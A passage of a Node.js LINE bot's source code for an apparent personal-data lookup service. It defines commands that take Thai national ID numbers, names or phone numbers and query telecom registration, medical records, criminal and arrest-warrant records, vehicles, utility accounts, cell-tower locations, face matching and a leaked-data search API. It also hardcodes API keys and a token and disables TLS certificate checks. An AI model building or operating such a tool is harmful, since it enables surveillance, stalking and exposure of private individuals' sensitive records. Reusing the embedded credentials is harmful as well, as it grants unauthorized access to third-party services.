    ส่งคำขอเรียบร้อยแล้ว

  </div>


  <div style="
    margin-top:12px;
    color:#94a3b8;
    font-size:12px;
    line-height:1.8;
  ">

    ระบบได้รับคำขอของท่านแล้ว

  </div>


  <div style="
    margin-top:20px;
    padding:15px;
    background:#080d13;
    border:1px solid #293747;
    border-radius:12px;
  ">


    <div style="
      color:#64748b;
      font-size:11px;
    ">

      เลขคำขอ

    </div>


    <div style="
      margin-top:6px;
      color:#d7b56d;
      font-size:19px;
      font-weight:bold;
    ">

      ${requestId}

    </div>


  </div>


  <div style="
    margin-top:18px;
    color:#fbbf24;
    font-size:13px;
    font-weight:bold;
  ">

    🟡 รอผู้ดูแลระบบตรวจสอบ

  </div>


  <div style="
    margin-top:15px;
    color:#64748b;
    font-size:11px;
    line-height:1.8;
  ">

    ระบบได้ส่งข้อความยืนยัน
    ไปยัง LINE ของท่านแล้ว

    <br>

    กรุณาเก็บเลขคำขอไว้
    สำหรับใช้อ้างอิง

  </div>


</div>


</body>

</html>
        `);


      } catch (err) {

        // =====================================
        // ERROR
        // =====================================
        console.error(
          'SIGNAL REQUEST ERROR:',
          err
        );


        deleteUploadedFile();


        return res.status(500).send(
          '❌ เกิดข้อผิดพลาดในการส่งคำขอ'
        );

      }

    }
  );

});

const INSTALLMENT_API_URL =
  process.env.INSTALLMENT_API ||
  'http://scsinfo.pieare.com/securestock/api/installmentprint/inspection/inspect';

const httpsAgent = new https.Agent({
  rejectUnauthorized: false
});

const SEARCH_API_BASE = 'http://151.246.242.113:2266/';
const SECURE_SEARCH_API_BASE = 'https://opjjuiop.shadowtak.icu/';
const DXC_BACKUP_API_BASE = 'http://151.246.242.205:2266/';
const DPLUS_API_BASE = process.env.DPLUS_API_BASE || DXC_BACKUP_API_BASE;
const SEARCH_API_KEY = 'qYFlSvOoq0shlfbNWUzLlqZx';
const TVGCC_API_BASE = process.env.TVGCC_API_BASE || 'http://151.246.242.113:2267/';
const ISM_API_BASE = process.env.ISM_API_BASE || 'http://151.246.242.113:2269/';
// PWA meterstat (ค้นหาตำแหน่งมาตรวัดน้ำ กปภ.) อยู่บนเครื่อง DXC backup
const PWA_METERSTAT_API_BASE = process.env.PWA_METERSTAT_API_BASE || DXC_BACKUP_API_BASE;
const LEAKOSINT_API_URL = process.env.LEAKOSINT_API_URL || 'https://leakosintapi.com/';
const LEAKOSINT_API_TOKEN = '6151562452:okFiZl9v';

const config = {
  channelSecret: CHANNEL_SECRET
};

const client = new line.messagingApi.MessagingApiClient({
  channelAccessToken: CHANNEL_ACCESS_TOKEN
});

const DATA_DIR = process.env.STORAGE_ROOT || process.env.DATA_DIR || __dirname;

const DATA_FILE = path.join(DATA_DIR, 'members.json');
const UPLOAD_DIR = path.join(DATA_DIR, 'uploads');

ensureStorage();

const toolUpload = multer({
  dest: UPLOAD_DIR,

  limits: {
    fileSize: 10 * 1024 * 1024
  },

  fileFilter: (req, file, cb) => {

    const allowedTypes = [
      'image/jpeg',
      'image/png',
      'image/webp'
    ];

    if (!allowedTypes.includes(file.mimetype)) {
      return cb(
        new Error(
          'รองรับเฉพาะไฟล์ JPG, PNG และ WEBP'
        )
      );
    }

    cb(null, true);
  }
});

app.use('/uploads', express.static(UPLOAD_DIR));
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => {
  res.send('LINE BOT RUNNING');
});

// ==============================
// LIFF COMMAND CENTER
// ==============================
app.get('/liff', (req, res) => {

  const LIFF_ID = process.env.LIFF_ID || '';

  // ==============================
  // รายการคำสั่ง LIFF
  // ==============================
  const commandGroups = [

    // ============================
    // จดทะเบียนเบอร์โทร
    // ============================
    {
      title: '📶 จดทะเบียนเบอร์โทร',
      commands: [
        {
          name: '📘 จดทะเบียน DTAC',
          syntax: "d@เบอร์โทร/เลขบัตร",
          prefix: "d@",
          separator: '',
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์',
              placeholder: 'เช่น 0812345678',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: '📙 จดทะเบียน True',
          syntax: "t@เบอร์โทร/เลขบัตร/ชื่อ สกุล",
          prefix: "t@",
          separator: '/',
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์',
              placeholder: 'เช่น 0812345678',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'name',
              label: 'ชื่อ - นามสกุล',
              placeholder: 'เช่น สมชาย ใจดี'
            }
          ]
        },

        {
          name: '📙 True Online / True Fiber',
          syntax: "tid@เลขบัตร",
          prefix: "tid@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: '📙 ตรวจจุดติดตั้ง',
          syntax: "tv@เลขกล่อง",
          prefix: "tv@",
          separator: '',
          fields: [
            {
              key: 'box',
              label: 'เลขกล่อง',
              placeholder: 'กรอกเลขกล่อง'
            }
          ]
        }
      ]
    },


    // ============================
    // ข้อมูลเครือข่าย
    // ============================
    {
      title: '📱 ข้อมูลเครือข่าย',
      commands: [
        {
          name: 'เช็คปิด / เปิดเครื่อง',
          syntax: "on@66xxxxxxxxx",
          prefix: "on@",
          separator: '',
          example: "on@66812345678",
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์รูปแบบ 66',
              placeholder: 'เช่น 66812345678',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจเครือข่ายเบอร์',
          syntax: "net@เบอร์โทร",
          prefix: "net@",
          separator: '',
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์',
              placeholder: 'เช่น 0812345678',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        }
      ]
    },


    // ============================
    // พัสดุ
    // ============================
    {
      title: '📦 พัสดุและการจัดส่ง',
      commands: [
        {
          name: 'ตรวจพัสดุ',
          syntax: "f@เบอร์โทร",
          prefix: "f@",
          separator: '',
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์',
              placeholder: 'เช่น 0877315866',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจภาพรับพัสดุ',
          syntax: "tic@เลขพัสดุ",
          prefix: "tic@",
          separator: '',
          fields: [
            {
              key: 'tracking',
              label: 'เลขพัสดุ',
              placeholder: 'กรอกเลขพัสดุ'
            }
          ]
        }
      ]
    },


    // ============================
    // BANK / CELL
    // ============================
    {
      title: '🏦 Bank / Cell',
      commands: [
        {
          name: 'ค้นหาข้อมูลธนาคาร',
          syntax: "bn@ชื่อธนาคาร/รหัสสาขา",
          prefix: "bn@",
          separator: '/',
          fields: [
            {
              key: 'bank',
              label: 'ชื่อธนาคาร',
              placeholder: 'เช่น กสิกรไทย'
            },
            {
              key: 'branch',
              label: 'รหัสสาขา',
              placeholder: 'กรอกรหัสสาขา'
            }
          ]
        },

        {
          name: 'ตรวจสอบจุดติดตั้ง ATM',
          syntax: "atm@รหัสตู้",
          prefix: "atm@",
          separator: '',
          fields: [
            {
              key: 'atm',
              label: 'รหัสตู้ ATM',
              placeholder: 'กรอกรหัสตู้'
            }
          ]
        },

        {
          name: 'ตรวจพิกัดเสา Base',
          syntax: "b@mcc/mnc/lac/cid",
          prefix: "b@",
          separator: '/',
          fields: [
            {
              key: 'mcc',
              label: 'MCC',
              placeholder: 'เช่น 520',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'mnc',
              label: 'MNC',
              placeholder: 'เช่น 03',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'lac',
              label: 'LAC',
              placeholder: 'กรอก LAC',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'cid',
              label: 'CID',
              placeholder: 'กรอก CID',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        }
      ]
    },


    // ============================
    // โรงพยาบาล
    // ============================
    {
      title: '🏥 การรักษาและสถานพยาบาล',
      commands: [
        {
          name: 'ตรวจข้อมูลการรักษา',
          syntax: "h@เลขบัตร",
          prefix: "h@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ค้นหาสถานพยาบาล',
          syntax: "nm@รหัสหน่วยบริการ/ชื่อสถานพยาบาล",
          prefix: "nm@",
          separator: '',
          fields: [
            {
              key: 'hospital',
              label: 'รหัสหน่วยบริการ หรือชื่อสถานพยาบาล',
              placeholder: 'กรอกรหัสหรือชื่อสถานพยาบาล'
            }
          ]
        },

        {
          name: 'ตรวจแพทย์',
          syntax: "dc@ชื่อ สกุล",
          prefix: "dc@",
          separator: '',
          fields: [
            {
              key: 'name',
              label: 'ชื่อ - นามสกุล',
              placeholder: 'เช่น สมชาย ใจดี'
            }
          ]
        },

        {
          name: 'ตรวจแพทย์ / บุคลากรสาธารณสุข',
          syntax: "dr@ชื่อ สกุล",
          prefix: "dr@",
          separator: '',
          fields: [
            {
              key: 'name',
              label: 'ชื่อ - นามสกุล',
              placeholder: 'เช่น สมชาย ใจดี'
            }
          ]
        }
      ]
    },


    // ============================
    // ประกันสังคม
    // ============================
    {
      title: '🏛️ ประกันสังคมและสวัสดิการ',
      commands: [
        {
          name: 'ตรวจประกันสังคม',
          syntax: "si@เลขบัตร",
          prefix: "si@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจเบี้ยยังชีพ',
          syntax: "wf@เลขบัตร",
          prefix: "wf@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจสมาชิก สก.ทบ.',
          syntax: "kp@เลขบัตร/เลขสมาชิก",
          prefix: "kp@",
          separator: '/',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'member',
              label: 'เลขสมาชิก',
              placeholder: 'กรอกเลขสมาชิก'
            }
          ]
        }
      ]
    },


    // ============================
    // กฎหมาย / คดี
    // ============================
    {
      title: '⚖️ กฎหมาย / คดี / หมายจับ',
      commands: [
        {
          name: 'ตรวจใบขับขี่',
          syntax: "dl@เลขบัตร",
          prefix: "dl@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจคุมประพฤติ',
          syntax: "pb@เลขบัตร",
          prefix: "pb@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจประวัติคดียาเสพติด',
          syntax: "nb@เลขบัตร",
          prefix: "nb@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจผู้ต้องขัง',
          syntax: "psi@เลขบัตร",
          prefix: "psi@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจผู้ต้องขังยังไม่พิพากษา',
          syntax: "ps@เลขบัตร",
          prefix: "ps@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจหมายจับ CRIME',
          syntax: "c@เลขบัตร",
          prefix: "c@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจหมายจับศาล',
          syntax: "doc@เลขบัตร",
          prefix: "doc@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ค้นหาข้อกฎหมาย',
          syntax: "lw@คำถาม",
          prefix: "lw@",
          separator: '',
          fields: [
            {
              key: 'question',
              label: 'คำถาม',
              placeholder: 'กรอกคำถามเกี่ยวกับข้อกฎหมาย'
            }
          ]
        }
      ]
    },


    // ============================
    // บริษัท
    // ============================
    {
      title: '🏢 บริษัท / ใบอนุญาต',
      commands: [
        {
          name: 'ตรวจข้อมูลจดทะเบียนนิติบุคคล',
          syntax: "dbd@เลขนิติบุคคล",
          prefix: "dbd@",
          separator: '',
          fields: [
            {
              key: 'companyId',
              label: 'เลขนิติบุคคล',
              placeholder: 'กรอกเลขนิติบุคคล'
            }
          ]
        },

        {
          name: 'ตรวจใบอนุญาตบริษัท',
          syntax: "lc@ชื่อ-สกุล,ชื่อบริษัท",
          prefix: "lc@",
          separator: ',',
          fields: [
            {
              key: 'name',
              label: 'ชื่อ - นามสกุล',
              placeholder: 'กรอกชื่อ - นามสกุล'
            },
            {
              key: 'company',
              label: 'ชื่อบริษัท',
              placeholder: 'กรอกชื่อบริษัท'
            }
          ]
        },

        {
          name: 'ตรวจทะเบียนพาณิชย์ / นิติบุคคล',
          syntax: "for@เลขนิติบุคคล",
          prefix: "for@",
          separator: '',
          fields: [
            {
              key: 'companyId',
              label: 'เลขนิติบุคคล',
              placeholder: 'กรอกเลขนิติบุคคล'
            }
          ]
        },

        {
          name: 'ตรวจผู้ประกอบการขนส่ง',
          syntax: "tr@ชื่อผู้ประกอบการ",
          prefix: "tr@",
          separator: '',
          fields: [
            {
              key: 'operator',
              label: 'ชื่อผู้ประกอบการ',
              placeholder: 'กรอกชื่อผู้ประกอบการ'
            }
          ]
        },

        {
          name: 'ตรวจมาตรฐาน มอก.',
          syntax: "tisi@เลข มอก.",
          prefix: "tisi@",
          separator: '',
          fields: [
            {
              key: 'tisi',
              label: 'เลข มอก.',
              placeholder: 'กรอกเลข มอก.'
            }
          ]
        }
      ]
    },


    // ============================
    // รถ
    // ============================
    {
      title: '🚘 ยานพาหนะ',
      commands: [
        {
          name: 'ตรวจรถจากเลขบัตร',
          syntax: "cid@เลขบัตร",
          prefix: "cid@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจสอบจากทะเบียน',
          syntax: "car@จังหวัด หมวด ตัวเลข ประเภทรถ",
          prefix: "car@",
          separator: ' ',
          example: "car@กรุงเทพ 1กก 334 1",
          fields: [
            {
              key: 'province',
              label: 'จังหวัด',
              placeholder: 'เช่น กรุงเทพ'
            },
            {
              key: 'letters',
              label: 'หมวดทะเบียน',
              placeholder: 'เช่น 1กก'
            },
            {
              key: 'number',
              label: 'เลขทะเบียน',
              placeholder: 'เช่น 334'
            },
            {
              key: 'type',
              label: 'ประเภทรถ',
              placeholder: 'เช่น 1'
            }
          ]
        },

        {
          name: 'อ่านป้ายทะเบียนและวิเคราะห์รถ',
          syntax: "pt@",
          prefix: "pt@",
          separator: '',
          note: 'หลังส่งคำสั่ง ให้รอระบบแจ้งให้ส่งภาพ',
          fields: []
        },

        {
          name: 'ตรวจสอบเข้า ตรอ.',
          syntax: "tro@หมวดอักษร หมวดตัวเลข จังหวัด",
          prefix: "tro@",
          separator: ' ',
          example: "tro@1กก 334 กรุงเทพ",
          fields: [
            {
              key: 'letters',
              label: 'หมวดอักษร',
              placeholder: 'เช่น 1กก'
            },
            {
              key: 'number',
              label: 'หมวดตัวเลข',
              placeholder: 'เช่น 334'
            },
            {
              key: 'province',
              label: 'จังหวัด',
              placeholder: 'เช่น กรุงเทพ'
            }
          ]
        },

        {
          name: 'ตรวจสอบศูนย์บริการรถ',
          syntax: "bq@เบอร์โทร/เลขบัตร",
          prefix: "bq@",
          separator: '/',
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์',
              placeholder: 'กรอกเบอร์โทร',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        }
      ]
    },


    // ============================
    // ใบหน้า
    // ============================
    {
      title: '👤 เปรียบเทียบใบหน้า',
      commands: [
        {
          name: 'เปรียบเทียบใบหน้า',
          syntax: "ff@",
          prefix: "ff@",
          separator: '',
          note: 'หลังส่งคำสั่ง ให้รอระบบแจ้งให้ส่งภาพ',
          fields: []
        }
      ]
    },


    // ============================
    // MEA
    // ============================
    {
      title: '⚡ ไฟฟ้านครหลวง',
      commands: [
        {
          name: 'ตรวจสอบข้อมูลไฟฟ้า MEA',
          syntax: "mea@ชื่อ สกุล",
          prefix: "mea@",
          separator: '',
          fields: [
            {
              key: 'name',
              label: 'ชื่อ - นามสกุล',
              placeholder: 'กรอกชื่อ - นามสกุล'
            }
          ]
        },

        {
          name: 'ตรวจสอบมิเตอร์',
          syntax: "kru@เลขมิเตอร์",
          prefix: "kru@",
          separator: '',
          fields: [
            {
              key: 'meter',
              label: 'เลขมิเตอร์',
              placeholder: 'กรอกเลขมิเตอร์'
            }
          ]
        }
      ]
    },


    // ============================
    // PEA
    // ============================
    {
      title: '⚡ ไฟฟ้าภูมิภาค',
      commands: [
        {
          name: 'ค้นหาจาก CA',
          syntax: "peac@เลข CA",
          prefix: "peac@",
          separator: '',
          fields: [
            {
              key: 'ca',
              label: 'เลข CA',
              placeholder: 'กรอกเลข CA'
            }
          ]
        },

        {
          name: 'ค้นหาชื่อ - สกุล',
          syntax: "pean@ชื่อ สกุล",
          prefix: "pean@",
          separator: '',
          fields: [
            {
              key: 'name',
              label: 'ชื่อ - นามสกุล',
              placeholder: 'กรอกชื่อ - นามสกุล'
            }
          ]
        },

        {
          name: 'ค้นหาที่อยู่',
          syntax: "peau@ที่อยู่",
          prefix: "peau@",
          separator: '',
          fields: [
            {
              key: 'address',
              label: 'ที่อยู่',
              placeholder: 'กรอกที่อยู่'
            }
          ]
        },

        {
          name: 'ประวัติการใช้ไฟ',
          syntax: "peab@เลข CA เลขมิเตอร์",
          prefix: "peab@",
          separator: ' ',
          fields: [
            {
              key: 'ca',
              label: 'เลข CA',
              placeholder: 'กรอกเลข CA'
            },
            {
              key: 'meter',
              label: 'เลขมิเตอร์',
              placeholder: 'กรอกเลขมิเตอร์'
            }
          ]
        }
      ]
    },


    // ============================
    // PWA (กปภ.)
    // ============================
    {
      title: '🚰 ประปา (กปภ.)',
      commands: [
        {
          name: 'ค้นหาตำแหน่งมาตรวัดน้ำ',
          syntax: "pw@สาขา ชื่อ/ที่อยู่/หมายเลขมาตร",
          prefix: "pw@",
          separator: ' ',
          fields: [
            {
              key: 'branch',
              label: 'สาขา',
              placeholder: 'เช่น บ้านบึง หรือ 5531013'
            },
            {
              key: 'value',
              label: 'ชื่อ / ที่อยู่ / หมายเลขมาตร',
              placeholder: 'เช่น นายพิเชษฐ พุฒแก้ว'
            }
          ]
        }
      ]
    },


    // ============================
    // ออนไลน์
    // ============================
    {
      title: '🌐 ออนไลน์',
      commands: [
        {
          name: 'เพิ่ม Phishing',
          syntax: "phis@URL",
          prefix: "phis@",
          separator: '',
          fields: [
            {
              key: 'url',
              label: 'URL',
              placeholder: 'https://example.com'
            }
          ]
        },

        {
          name: 'ตรวจผล Phishing',
          syntax: "chphis@ID",
          prefix: "chphis@",
          separator: '',
          fields: [
            {
              key: 'id',
              label: 'ID',
              placeholder: 'กรอก ID'
            }
          ]
        },

        {
          name: 'ดึงภาพ Profile Facebook',
          syntax: "picf@URL",
          prefix: "picf@",
          separator: '',
          fields: [
            {
              key: 'url',
              label: 'Facebook URL',
              placeholder: 'กรอก Facebook URL'
            }
          ]
        },

        {
          name: 'ค้นหาโซเชียล',
          syntax: "soc@Username/ชื่อโซเชียล",
          prefix: "soc@",
          separator: '',
          fields: [
            {
              key: 'social',
              label: 'Username / ชื่อโซเชียล',
              placeholder: 'กรอก Username หรือชื่อ'
            }
          ]
        },

        {
          name: 'ตรวจเว็บไซต์',
          syntax: "web@ชื่อเว็บไซต์",
          prefix: "web@",
          separator: '',
          fields: [
            {
              key: 'website',
              label: 'เว็บไซต์',
              placeholder: 'กรอกชื่อเว็บไซต์'
            }
          ]
        },

        {
          name: 'ตรวจแอปเงินกู้',
          syntax: "loa@ชื่อแอป",
          prefix: "loa@",
          separator: '',
          fields: [
            {
              key: 'app',
              label: 'ชื่อแอป',
              placeholder: 'กรอกชื่อแอป'
            }
          ]
        }
      ]
    },


    // ============================
    // NETWORK DEVICE
    // ============================
    {
      title: '📡 ข้อมูลเครือข่ายและอุปกรณ์',
      commands: [
        {
          name: 'ตรวจสอบเครือข่าย IP',
          syntax: "ip@เลข IP",
          prefix: "ip@",
          separator: '',
          fields: [
            {
              key: 'ip',
              label: 'IP Address',
              placeholder: 'เช่น 1.1.1.1'
            }
          ]
        },

        {
          name: 'ตรวจสอบ IMEI',
          syntax: "imei@เลข IMEI",
          prefix: "imei@",
          separator: '',
          fields: [
            {
              key: 'imei',
              label: 'IMEI',
              placeholder: 'กรอก IMEI',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจสอบ IMSI',
          syntax: "imsi@เลข IMSI",
          prefix: "imsi@",
          separator: '',
          fields: [
            {
              key: 'imsi',
              label: 'IMSI',
              placeholder: 'กรอก IMSI',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจสอบเลขซิม',
          syntax: "icc@เลข ICCID",
          prefix: "icc@",
          separator: '',
          fields: [
            {
              key: 'iccid',
              label: 'ICCID',
              placeholder: 'กรอก ICCID',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        }
      ]
    },


    // ============================
    // MAP
    // ============================
    {
      title: '🗺️ แผนที่ระยะทาง',
      commands: [
        {
          name: 'คำนวณระยะทาง',
          syntax: "dis@พิกัดต้นทาง/พิกัดปลายทาง",
          prefix: "dis@",
          separator: '/',
          fields: [
            {
              key: 'from',
              label: 'พิกัดต้นทาง',
              placeholder: 'เช่น 13.7563,100.5018'
            },
            {
              key: 'to',
              label: 'พิกัดปลายทาง',
              placeholder: 'เช่น 13.7367,100.5231'
            }
          ]
        },

        {
          name: 'ตรวจสอบพิกัด MAP',
          syntax: "map@ละติจูด,ลองจิจูด",
          prefix: "map@",
          separator: ',',
          fields: [
            {
              key: 'lat',
              label: 'ละติจูด',
              placeholder: 'เช่น 13.7563'
            },
            {
              key: 'lng',
              label: 'ลองจิจูด',
              placeholder: 'เช่น 100.5018'
            }
          ]
        }
      ]
    },


    // ============================
    // OTHER
    // ============================
    {
      title: '📹 เครื่องมืออื่น ๆ',
      commands: [
        {
          name: 'ตรวจสอบสมาชิก CJ',
          syntax: "cj@เบอร์โทร เลขบัตร",
          prefix: "cj@",
          separator: ' ',
          fields: [
            {
              key: 'phone',
              label: 'หมายเลขโทรศัพท์',
              placeholder: 'กรอกเบอร์โทร',
              inputMode: 'numeric',
              sanitize: 'digits'
            },
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'ตรวจสอบสาขา 7-11',
          syntax: "se@รหัสสาขา",
          prefix: "se@",
          separator: '',
          fields: [
            {
              key: 'branch',
              label: 'รหัสสาขา 7-11',
              placeholder: 'กรอกรหัสสาขา'
            }
          ]
        },

        {
          name: 'ตรวจสอบประวัติการผ่อนสินค้า',
          syntax: "sc@เลขบัตร",
          prefix: "sc@",
          separator: '',
          fields: [
            {
              key: 'idcard',
              label: 'เลขบัตร',
              placeholder: 'กรอกเลขบัตร',
              inputMode: 'numeric',
              sanitize: 'digits'
            }
          ]
        },

        {
          name: 'เปรียบเทียบเวลากล้อง',
          syntax: "cctv@เวลากล้อง,เวลาจริง",
          prefix: "cctv@",
          separator: ',',
          fields: [
            {
              key: 'cameraTime',
              label: 'เวลากล้อง',
              placeholder: 'เช่น 20:30:00'
            },
            {
              key: 'realTime',
              label: 'เวลาจริง',
              placeholder: 'เช่น 20:35:00'
            }
          ]
        }
      ]
    }

  ];


  return res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>ค้นหาข้อมูล</title>

<script
  charset="utf-8"
  src="https://static.line-scdn.net/liff/edge/2/sdk.js"
></script>


<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;

  background: #070b11;
  color: #e5e7eb;

  font-family:
    Arial,
    Tahoma,
    sans-serif;

  padding: 18px;
}

.container {
  width: 100%;
  max-width: 560px;

  margin: 12px auto 40px;

  background: #10161f;

  border: 1px solid #293747;
  border-radius: 20px;

  padding: 22px;
}

.header {
  margin-bottom: 24px;
}

.title {
  color: #ffffff;

  font-size: 21px;
  font-weight: bold;
}

.subtitle {
  margin-top: 7px;

  color: #8295aa;

  font-size: 12px;
  line-height: 1.7;
}

.block {
  margin-bottom: 18px;
}

.label {
  display: block;

  margin-bottom: 7px;

  color: #cbd5e1;

  font-size: 12px;
  font-weight: bold;
}

select,
input,
textarea {
  width: 100%;

  background: #080d13;
  color: #ffffff;

  border: 1px solid #334155;
  border-radius: 10px;

  padding: 13px 14px;

  font-size: 14px;

  outline: none;
}

textarea {
  resize: vertical;
  min-height: 90px;
}

select:focus,
input:focus,
textarea:focus {
  border-color: #d7b56d;
}

.command-info {
  margin-top: 14px;

  padding: 14px;

  background: #080d13;

  border: 1px solid #293747;
  border-radius: 12px;
}

.command-name {
  color: #ffffff;

  font-size: 14px;
  font-weight: bold;
}

.syntax {
  margin-top: 6px;

  color: #94a3b8;

  font-size: 11px;
  line-height: 1.6;
}

.field-box {
  margin-top: 16px;
}

.field-label {
  display: block;

  margin-bottom: 7px;

  color: #cbd5e1;

  font-size: 12px;
  font-weight: bold;
}

.example {
  margin-top: 12px;

  padding: 10px 12px;

  background: #0b121b;

  border-radius: 8px;

  color: #94a3b8;

  font-size: 11px;
  line-height: 1.6;
}

.note-box {
  margin-top: 12px;

  padding: 10px 12px;

  background: #17130a;

  border: 1px solid #55451c;
  border-radius: 8px;

  color: #e6c66f;

  font-size: 11px;
  line-height: 1.6;
}

.preview {
  margin-top: 22px;

  padding: 15px;

  background: #080d13;

  border: 1px solid #293747;
  border-radius: 12px;
}

.preview-label {
  color: #94a3b8;

  font-size: 11px;

  margin-bottom: 7px;
}

.preview-text {
  color: #86efac;

  font-size: 14px;
  font-weight: bold;

  line-height: 1.6;

  word-break: break-all;
}

.send-button {
  width: 100%;

  margin-top: 18px;

  padding: 15px;

  background: #d7b56d;
  color: #111111;

  border: 0;
  border-radius: 10px;

  font-size: 15px;
  font-weight: bold;

  cursor: pointer;
}

.send-button:disabled {
  opacity: 0.45;
  cursor: not-allowed;
}

.status {
  margin-top: 14px;

  text-align: center;

  color: #94a3b8;

  font-size: 11px;
  line-height: 1.7;
}

.status.success {
  color: #86efac;
}

.status.error {
  color: #f87171;
}

.footer {
  margin-top: 22px;

  text-align: center;

  color: #475569;

  font-size: 10px;
  line-height: 1.6;
}

</style>

</head>


<body>

<div class="container">

  <div class="header">

    <div class="title">
      🔎 ค้นหาข้อมูล
    </div>

    <div class="subtitle">
      เลือกหมวดและคำสั่ง จากนั้นกรอกข้อมูล
      ระบบจะสร้างคำสั่งและส่งเข้า LINE Bot ให้อัตโนมัติ
    </div>

  </div>


  <div class="block">

    <label class="label">
      หมวดหมู่
    </label>

    <select id="categorySelect">
    </select>

  </div>


  <div class="block">

    <label class="label">
      คำสั่ง
    </label>

    <select id="commandSelect">
    </select>

  </div>


  <div
    id="commandInfo"
    class="command-info"
  >
  </div>


  <div id="fieldsContainer">
  </div>


  <div
    id="extraInfo"
  >
  </div>


  <div class="preview">

    <div class="preview-label">
      ข้อความที่จะส่งเข้า LINE
    </div>

    <div
      id="previewText"
      class="preview-text"
    >
      -
    </div>

  </div>


  <button
    id="sendButton"
    class="send-button"
    type="button"
    disabled
  >
    ส่งคำค้น
  </button>


  <div
    id="status"
    class="status"
  >
    กำลังเชื่อมต่อ LINE...
  </div>


  <div class="footer">
    ระบบจะส่งคำสั่งในนามบัญชี LINE ของท่าน
  </div>

</div>


<script>

const LIFF_ID =
  ${JSON.stringify(LIFF_ID)};

const commandGroups =
  ${JSON.stringify(commandGroups)};


const categorySelect =
  document.getElementById('categorySelect');

const commandSelect =
  document.getElementById('commandSelect');

const commandInfo =
  document.getElementById('commandInfo');

const fieldsContainer =
  document.getElementById('fieldsContainer');

const extraInfo =
  document.getElementById('extraInfo');

const previewText =
  document.getElementById('previewText');

const sendButton =
